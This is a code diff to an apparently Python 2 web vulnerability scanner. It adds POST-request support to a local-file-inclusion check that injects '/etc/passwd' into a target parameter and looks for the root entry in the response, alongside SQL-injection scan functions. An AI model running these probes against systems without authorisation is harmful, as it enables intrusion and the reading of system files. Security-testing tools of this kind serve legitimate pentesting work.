@@ -64,7 +64,7 @@ def scan_sql_error(method, vulns, url, fuzz, cookie, useragent, data):
 		print "\t\t\033[94mSQLi Failed \033[0m for ", fuzz, " with the payload :", payload
 
 
-"""scan_sql_blind_time /!\ TODO : POST request (check method, data)
+"""scan_sql_blind_time 
 Description: use a polyglot vector to detect a SQL injection based on the response time
 Parameters: vulns - list of vulnerabilities, url - address of the target, fuzz - parameter we modify
 """
@@ -110,21 +110,34 @@ def scan_sql_blind_time(method, vulns, url, fuzz, cookie, useragent, data):
 			print "\t\t\033[94mTime Based SQLi (", name ,") Failed \033[0m for ", fuzz, " with the payload :", payload
 
 
-"""scan_lfi /!\ TODO : POST request (check method, data)
+"""scan_lfi 
 Description: will scan every parameter for LFI, checking for the common root:x:0:0
 Parameters: vulns - list of vulnerabilities, url - address of the target, fuzz - parameter we modify
 """
 def scan_lfi(method, vulns, url, fuzz, cookie, useragent, data):
 	payload = "/etc/passwd"
-	inject  = re.sub(fuzz+"="+"(.[^&]*)", fuzz+"="+payload , url)
-	content = requests.get(inject, cookies=cookie, headers={'user-agent': useragent} ).text
 
+	# POST
+	if (method == 'POST'):
+		inject = dict(data)
+		inject[fuzz] = payload
+		content = requests.post(url, data=inject ,cookies=cookie, headers={'user-agent': useragent} ).text
+		
+		# Change the inject to have a nice display in the plugin
+		inject = url + ":" + fuzz + ":" + inject[fuzz]
+
+	# GET
+	else:
+		inject  = re.sub(fuzz+"="+"(.[^&]*)", fuzz+"="+payload , url)
+		content = requests.get(inject, cookies=cookie, headers={'user-agent': useragent} ).text
+
+	# Check for a common string in /etc/passwd
 	if "root:x:0:0:root:/root:/bin/bash" in content:
 		print "\t\t\033[93mLFI Detected \033[0m for ", fuzz, " with the payload :", payload
 		vulns['lfi']  += 1
 		vulns['list'] += 'LFI|TYPE|'+inject+'|DELIMITER|'
 	else:
-		print "\t\t\033[94mLFI Failed \033[0m for ", fuzz, " with the payload :", payload, inject
+		print "\t\t\033[94mLFI Failed \033[0m for ", fuzz, " with the payload :", payload
 
 
 """scan_rce /!\ TODO : POST request (check method, data)
